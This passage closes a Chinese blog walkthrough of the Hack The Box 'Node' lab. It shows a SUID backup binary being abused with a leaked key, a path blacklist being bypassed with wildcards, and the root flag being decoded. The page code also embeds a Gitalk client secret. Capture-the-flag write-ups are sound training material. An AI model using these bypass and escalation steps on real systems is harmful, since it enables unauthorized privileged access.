      var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]);
      var backup = &#39;&#39;;
</code></pre>
<p>backup 的运行格式是 backup -q key 文件目录，然后就会把我们指定的目录给打包为压缩文件</p>
<p>还记得我们在 app.js 中找到的密钥 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 吗？派上用场了</p>
<pre><code class="bash">tom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
&lt;ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root         
 [+] Finished! Encoded backup is below:

UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
</code></pre>
<pre><code class="bash">UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
</code></pre>
<p>得到了一串 base64 码，进行查看并解压</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# base64 -d base &gt; base_encode 

┌──(root㉿lucifiel)-[~/Desktop]
└─# file base_encode 
base_encode: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
</code></pre>
<p>确实是会被压缩为 zip 文件</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# unzip base_encode 
Archive:  base_encode
   skipping: root.txt                need PK compat. v5.1 (can do v4.6)
</code></pre>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# cat root.txt     
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&quot;?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW&#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP&#39;.yQQQQQQQQQQQP&quot;       &lt;wa,.!4WQQQQQQQWdWP??!&quot;??4WWQQQWQQc ?QWQQQQQ
QQQQQP&#39;_a.&lt;aamQQQW!&lt;yF &quot;!` ..  &quot;??$Qa &quot;WQQQWTVP&#39;    &quot;??&#39; =QQmWWV?46/ ?QQQQQ
QQQP&#39;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP&#39;adQQP4ga, -????&quot; &lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD&#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 &quot;WWQma/  &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@  &quot;QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??&#39;&lt;mWWWWWQW?^  ` ]6QQ&#39; yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  &quot;????9VWaamQWV???&quot;  a j/  ]QQf jQQQQQQ
QQQQQQw,&quot;4QQQQQQm,-$Qa     ???4F jQQQQQwc &lt;aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk &lt;c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ&#39;.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,.&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma &quot;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws &quot;Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&quot;!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
</code></pre>
<p>使用解压密码 magicword 进行查看后，得到了刚才我们发现了有趣的笑脸，查看代码后判断应该是关键字被列入黑名单了</p>
<pre><code class="bash">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt
</code></pre>
<p>我们使用通配符绕过黑名单</p>
<pre><code class="bash">tom@node:/usr/local/bin$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt                                                                                                           
&lt;ac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt                                                                                                                                                               
UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWUoAy1l1eAsAAQQAAAAABAAAAACh3rCOvOQdB5V16DWzjmraL4LSDQyRE+gYobSHgwWoyN2auhvRchazKrlNmtBQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA
</code></pre>
<p>再去使用之前获得的解压密码 magicword 进行解压</p>
<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
└─# cat data    
UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWXLP2GJ1eAsAAQQAAAAABAAAAABxTsld158Zh1jLqaTlLhGh3omZpdVMsbbF4rimamhoJAz6zDqxvNxiE/AktcJQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA

┌──(root㉿lucifiel)-[~/Desktop]
└─# base64 -d data &gt; data_encode          

┌──(root㉿lucifiel)-[~/Desktop]
└─# file data_encode 
data_encode: Zip archive data, at least v1.0 to extract, compression method=store

┌──(root㉿lucifiel)-[~/Desktop]
└─# unzip data_encode 
Archive:  data_encode
[data_encode] root/root.txt password: 
 extracting: root/root.txt           

┌──(root㉿lucifiel)-[~/Desktop]
└─# cat root/root.txt 
1722e99ca5f353b362556a62bd5e6be0
</code></pre>
<p>成功拿到 root 权限的 flag 文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/&title=《Node - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/&title=《Node - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Node - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/08/04/Hackthebox/Hackthebox-Armageddon/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Armageddon - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/07/14/Hackthebox/Hackthebox-Cronos/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Cronos - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/&title=《Node - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/&title=《Node - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Node - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/08/01/Hackthebox/Hackthebox-Node/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACK0lEQVR42u3a0WojMQwF0P7/T6ewTwsBz5Xk0sY+fhomjcdnCool6+srHq9/Y339/533+++fvs+z/u6GgYGB8bGM13KsF7f+++Q6+e56bRgYGPcw8iDbC51JMF2THtaMgYGBUVxuvnGszoCBgYHRY/SS1eoWEwMDAyNJYqubwl0Bd3MujoGB8YGMXQcDP3H9C+cbGBgYf4zxao15WlvdVj6sBwMD42hG9THJ4ycNFtVXFuXcGBgYRzB+onBfDa+9jSkGBsYNjGpRrBoo80DcewUYGBg3MCaY6gxrXl5ie0hiMTAwDmVUl1Xd3vUONUfBFwMD4zjGJIzmoXOexGJgYNzJ2LuUvZu//FgUAwPjBkZSSltjeslqb+aHnhEMDIzjGJN8t9pCMUmVCz8MGBgYxzESZVJKqzZJ9No1Hv4DGBgYRzPmbROTpoo8iS3EfgwMjOMYk4LXGp+3l+Xsh98NDAyMQxnJopuhMA7r1WaLctUQAwPjCEa+scvZOS8vtz0cYWJgYBzHqJbje00VeVjf8MowMDCOY1QnKpfsi1u9/CkYGBj3MPJmi7zoltzvHRhEJTkMDIzjGK/i2BWC974aDAyMsxnVAJcEzfyooNpAtmFgYGB8LGPeNjGZc97egYGBcQ8jbw7LjwSqW8lq/o2BgYGRl8YmZbVdKTEGBgZGL8nsNX41C2oYGBgXMPIkdvJpHqDzRg0MDIwbGPODgfx4sregXS0aGBgYH8j4BhSmHfPrkmt+AAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
